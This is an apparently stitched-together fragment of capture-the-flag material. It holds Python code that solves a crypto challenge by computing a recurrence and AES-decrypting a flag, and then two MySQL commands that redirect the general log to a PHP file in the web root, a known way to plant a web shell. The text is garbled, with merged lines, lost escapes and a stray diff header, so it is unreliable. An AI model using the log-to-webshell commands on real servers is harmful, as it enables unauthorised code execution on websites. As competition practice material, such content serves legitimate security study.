 a = 12760960185046114319373228302773710922517145043260117201359198182268919830481221094839217650474599663154368235126389153552714679678111020813518413419360215b = 10117047970182219839870108944868089481578053385699469522500764052432603914922633010879926901213308115011559044643704414828518671345427553143525049573118673m = 9088893209826896798482468360055954173455488051415730079879005756781031305351828789190798690556659137238815575046440957403444877123534779101093800357633817seq = [1588310287911121355041550418963977300431302853564488171559751334517653272107112155026823633337984299690660859399029380656951654033985636188802999069377064, 12201509401878255828464211106789096838991992385927387264891565300242745135291213238739979123473041322233985445125107691952543666330443810838167430143985860, 13376619124234470764612052954603198949430905457204165522422292371804501727674375468020101015195335437331689076325941077198426485127257539411369390533686339, 8963913870279026075472139673602507483490793452241693352240197914901107612381260534267649905715779887141315806523664366582632024200686272718817269720952005, 5845978735386799769835726908627375251246062617622967713843994083155787250786439545090925107952986366593934283981034147414438049040549092914282747883231052, 9415622412708314171894809425735959412573511070691940566563162947924893407832253049839851437576026604329005326363729310031275288755753545446611757793959050, 6073533057239906776821297586403415495053103690212026150115846770514859699981321449095801626405567742342670271634464614212515703417972317752161774065534410, 3437702861547590735844267250176519238293383000249830711901455900567420289208826126751013809630895097787153707874423814381309133723519107897969128258847626, 2014101658279165374487095121575610079891727865185371304620610778986379382402770631536432571479533106528757155632259040939977258173977096891411022595638738, 10762035186018188690203027733533410308197454736009656743236110996156272237959821985939293563176878272006006744403478220545074555281019946284069071498694967]ct = 0x37dc072bdf4cdc7e9753914c20cbf0b55c20f03249bacf37c88f66b10b72e6e678940eecdb4c0be8466f68fdcd13bd81
 n = 2023
@@ -721,11 +652,6 @@ def seqsum(i): ans = 0 for j in range(len(seq)): ans += gp.powmod(i, j, m) * seq
 def home1work(n): if n == 1: return 1 elif n == 2: return 1 else: previous, current = 1, 1 for i in tqdm(range(3, n + 1)): previous, current = current, (a * current + b * previous + seqsum(i)) % m return current
 ans = home1work(n)
 k = unhexlify(md5(str(ans).encode()).hexdigest())aes = AES.new(k, AES.MODE_ECB)#data = flag + (16 - len(flag) % 16) * b"x00"data=long_to_bytes(ct)ct = aes.decrypt(data)print(ct)#b"c7ceedc7197a0d350025fff478f667293ebbaa6b'x00x00x00x00x00x00x00"
-```
-
-
-
-```
 set global general_log='on'
 set global general_log_file='/var/www/html/sEcR@t_n@Bodyknow.php'
 ```
